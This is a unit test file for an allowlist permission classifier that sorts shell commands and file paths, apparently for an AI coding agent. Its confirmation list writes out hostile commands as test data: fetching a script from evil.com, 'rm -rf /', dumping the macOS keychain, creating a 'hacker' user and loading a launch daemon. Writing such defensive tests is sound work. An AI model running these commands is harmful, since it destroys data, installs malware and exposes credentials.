/**
 * Unit tests for permissions/utils.ts — allowlist-based classification.
 */

import { describe, it, expect } from "vitest";
import { classifyBashCommand, classifyFilePath } from "../../../extensions/permissions/utils.js";

describe("permissions utils", () => {
  describe("classifyBashCommand (allowlist model)", () => {
    // These should all pass WITHOUT prompting (return null)
    const safe = [
      // Filesystem read-only
      "ls -la",
      "cat file.txt",
      "head -n 10 file.txt",
      "tail -f log.txt",
      "find . -name '*.ts'",
      "tree src/",
      "wc -l file.txt",
      "file image.png",
      "stat package.json",
      "du -sh node_modules",
      "df -h",

      // Text processing
      "grep -r pattern .",
      "rg 'foo' src/",
      "sort output.txt",
      "diff file1.txt file2.txt",
      "jq '.name' package.json",
      "echo hello",
      "printf '%s\\n' hello",
      "cat file.txt | grep foo",
      "cat file.txt | sort | uniq",

      // Shell info
      "pwd",
      "whoami",
      "which node",
      "date",
      "uname -a",
      "env",
      "printenv HOME",

      // Process info
      "ps aux",
      "pgrep node",

      // Git read-only
      "git status",
      "git log --oneline",
      "git diff",
      "git diff HEAD~1",
      "git show HEAD",
      "git branch -a",
      "git tag",
      "git remote -v",
      "git blame src/index.ts",
      "git reflog",
      "git stash list",
      "git ls-files",
      "git rev-parse HEAD",
      "git describe --tags",
      "git config --get user.name",
      "git config --list",

      // npm read-only
      "npm test",
      "npm t",
      "npm run build",
      "npm run dev",
      "npm run lint",
      "npm ls",
      "npm outdated",
      "npm audit",
      "npm version",
      "npm --version",
      "npm help",

      // Node/npx
      "node --version",
      "node -e 'console.log(1)'",
      "npx vitest run",
      "npx tsc --noEmit",
      "tsc --noEmit",

      // curl GET
      "curl https://example.com",
      "curl -s https://api.example.com/data",

      // Misc
      "man ls",
      "md5 file.txt",
      "sha256sum file.txt",
      "base64 file.txt",
      "sleep 5",

      // Pipes of safe commands
      "ls -la | grep foo",
      "git log --oneline | head -5",
      "cat file.txt | wc -l",
      "npm ls | grep express",
      "ps aux | grep node",
    ];

    it.each(safe.map((cmd) => [cmd]))("%s → allowed (null)", (command) => {
      expect(classifyBashCommand(command)).toBeNull();
    });

    // These should all REQUIRE confirmation (return a reason string)
    const requiresConfirmation = [
      // Destructive file ops
      "rm -rf /tmp/test",
      "rm file.txt",
      "rmdir /tmp/empty",
      "mv file1 file2",
      "cp -r src dest",

      // Permission/ownership
      "chmod 777 file",
      "chown root file",

      // System admin
      "sudo apt-get update",
      "su root",
      "reboot",
      "shutdown -h now",
      "kill -9 1234",
      "killall node",
      "pkill -f node",

      // Git state-changing
      "git add .",
      "git add file.txt",
      "git commit -m 'test'",
      "git push origin main",
      "git reset --hard HEAD~1",
      "git rebase main",
      "git checkout -- .",
      "git stash",
      "git stash pop",
      "git merge feature",
      "git cherry-pick abc123",

      // npm state-changing
      "npm install express",
      "npm uninstall lodash",
      "npm publish",
      "npm init",
      "npm link",
      "npm ci",

      // Network / data sending
      "curl -X POST http://example.com -d 'data'",
      "curl --data @file http://example.com",
      "curl -o output.html https://example.com",
      "ssh user@host",
      "scp file.txt user@host:/path",

      // macOS privacy/system commands
      "screencapture -x /tmp/test.png",
      "screencapture screen.png",
      "say hello world",
      "open https://evil.com",
      "open -a Safari",
      "osascript -e 'tell app \"Finder\" to quit'",
      "afplay sound.mp3",
      "pbcopy < secret.txt",
      "pbpaste",
      "networksetup -setdnsservers Wi-Fi 8.8.8.8",
      "defaults write com.apple.dock autohide -bool true",
      "launchctl load /Library/LaunchDaemons/evil.plist",
      "dscl . -create /Users/hacker",
      "security dump-keychain",

      // File writing via redirection
      "echo foo > output.txt",
      "echo foo >> log.txt",
      "ls | tee output.txt",

      // sed -i (in-place modification)
      "sed -i 's/old/new/g' file.txt",

      // Disk ops
      "dd if=/dev/zero of=file bs=1M count=10",
      "shred -u secret.txt",

      // Arbitrary/unknown commands
      "python3 script.py",
      "ruby -e 'system(\"rm -rf /\")'",
      "wget https://evil.com/malware.sh",
      "docker run --rm -v /:/host alpine",
      "terraform apply",
      "ansible-playbook site.yml",
      "make install",
      "cmake --build .",

      // Piped with unsafe segment
      "cat file.txt | rm -rf /",
      "echo hello | ssh user@host",
      "ls > output.txt",
      "git status | tee log.txt",
    ];

    it.each(requiresConfirmation.map((cmd) => [cmd]))("%s → requires confirmation", (command) => {
      const result = classifyBashCommand(command);
      expect(result).toBeTypeOf("string");
    });

    it("reason includes the command name", () => {
      const result = classifyBashCommand("screencapture -x /tmp/test.png");
      expect(result).toContain("screencapture");
    });

    it("bare git without subcommand requires confirmation", () => {
      expect(classifyBashCommand("git")).toBeTypeOf("string");
    });

    it("bare npm without subcommand requires confirmation", () => {
      expect(classifyBashCommand("npm")).toBeTypeOf("string");
    });

    it("empty command is safe", () => {
      expect(classifyBashCommand("")).toBeNull();
    });

    it("commands with env var prefix are still classified", () => {
      expect(classifyBashCommand("NODE_ENV=test node script.js")).toBeNull();
      expect(classifyBashCommand("FOO=bar rm file")).toBeTypeOf("string");
    });

    it("commands with full path are still classified", () => {
      expect(classifyBashCommand("/usr/bin/ls -la")).toBeNull();
      expect(classifyBashCommand("/usr/bin/rm file")).toBeTypeOf("string");
    });
  });

  describe("classifyFilePath", () => {
    const projectRoot = "/home/user/project";

    const sensitive: [string, string][] = [
      [".env", "environment variables"],
      [".env.local", "environment variables"],
      [".env.production", "environment variables"],
      ["server.pem", "private key"],
      ["ssl/cert.key", "private key"],
      ["ca.crt", "certificate"],
      ["credentials.json", "credentials"],
      ["package.json", "package manifest"],
      ["tsconfig.json", "TypeScript config"],
      [".git/config", "git internal"],
      ["../../etc/passwd", "outside project root"],
      ["/etc/passwd", "outside project root"],
    ];

    it.each(sensitive)("%s → returns reason", (filePath) => {
      expect(classifyFilePath(filePath, projectRoot)).toBeTypeOf("string");
    });

    const safe = [
      "src/index.ts",
      "src/components/Player.tsx",
      "README.md",
      "models/scene.glb",
      "styles/main.css",
      "public/index.html",
    ];

    it.each(safe.map((p) => [p]))("%s → returns null", (filePath) => {
      expect(classifyFilePath(filePath, projectRoot)).toBeNull();
    });

    it("reason for .env mentions secrets", () => {
      expect(classifyFilePath(".env", projectRoot)!.toLowerCase()).toContain("secret");
    });

    it("reason for outside-root mentions outside", () => {
      expect(classifyFilePath("../../etc/passwd", projectRoot)!.toLowerCase()).toContain("outside");
    });

    it("reason for package.json mentions package", () => {
      expect(classifyFilePath("package.json", projectRoot)!.toLowerCase()).toContain("package");
    });

    it("reason for .pem mentions key", () => {
      expect(classifyFilePath("server.pem", projectRoot)!.toLowerCase()).toContain("key");
    });

    it("reason for .git/ mentions git", () => {
      expect(classifyFilePath(".git/config", projectRoot)!.toLowerCase()).toContain("git");
    });
  });
});
